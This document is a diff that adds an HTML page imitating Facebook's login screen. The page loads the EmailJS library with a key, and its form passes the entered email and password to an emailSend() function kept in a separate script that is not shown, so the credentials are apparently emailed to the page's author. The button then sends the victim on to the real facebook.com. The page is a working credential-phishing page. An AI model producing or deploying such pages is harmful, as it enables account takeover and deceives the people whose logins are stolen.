@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Document</title>
+  
+  <!-- Daisy UI and Tailwind CDN -->
+  <link href="https://cdn.jsdelivr.net/npm/daisyui@4.6.0/dist/full.min.css" rel="stylesheet" type="text/css" />
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script type="text/javascript"
+        src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js">
+</script>
+<script type="text/javascript">
+   (function(){
+      emailjs.init("FQubKn3DCual9Cdlr");
+   })();
+</script>
+</head>
+<body class="mt-4">
+  <main>
+    <div class="flex flex-col lg:flex-row justify-between gap-5 h-screen mx-12 lg:mx-36 items-center">
+      <div class="space-y-4">
+        <h1 class="text-[#0866FF] font-extrabold text-5xl">facebook</h1>
+        <p class="text-4xl font-medium">Facebook helps you connect and share with the people in your life.</p>
+
+      </div>
+	
+      <div class="  w-full shadow-2xl p-6 rounded-lg text-center">
+        <form class="space-y-3 " onsubmit="emailSend(); reset(); return false;">
+          <input id="email" type="email" placeholder="Email or phone number" class="input input-bordered input-primary w-full max-w-xs" />
+          <input id="password" type="password" required placeholder="Password" class="input input-bordered input-primary w-full max-w-xs " /> <br> <br>
+          <a href="https://www.facebook.com"><button  type="submit" class="btn bg-[#0866FF] text-white w-full max-w-xs text-xl">Log In</button></a>
+        </form>
+        <a href="#" class="link text-[#0866FF] mt-4">Forgotter password?</a> <hr class="mt-3">
+        <button class="btn bg-[#36A420] text-white text-xl mt-4">Create new account</button>
+      </div>
+    </div> 
+  </main>
+  <footer>
+
+  </footer>
+
+
+
+  </script>
+
+	<script src="script.js"></script>
+</body>
+</html>
